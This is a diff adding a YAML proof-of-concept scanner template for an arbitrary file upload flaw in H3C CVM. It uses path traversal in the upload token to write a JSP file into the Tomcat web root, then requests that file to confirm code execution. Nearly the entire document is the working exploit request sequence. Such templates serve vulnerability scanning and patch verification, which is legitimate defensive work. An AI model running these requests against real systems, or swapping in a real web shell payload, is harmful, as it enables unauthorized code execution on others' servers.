@@ -1,0 +1,30 @@
+id: poc-yaml-h3c-cvm-fileupload-anyfile-upload
+info:
+  name: H3C CVM 前台任意文件上传漏洞
+  severity: critical
+  tags:
+  - 两高一弱
+  - 文件上传
+  finger: H3C-CVM
+variables:
+  t1: random_str(3)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/{{.t1}}.jsp&name=123
+  headers:
+    Content-Range: bytes 0-10/20
+  data: <%out.println("{{.t2}}");%>
+  expression: 'status_code == 200
+
+    && contains(body,"\"success\":true")
+
+    '
+- method: GET
+  path: /cas/js/lib/buttons/{{.t1}}.jsp
+  expression: 'status_code == 200
+
+    && contains(body,t2)
+
+    '
+transport: http
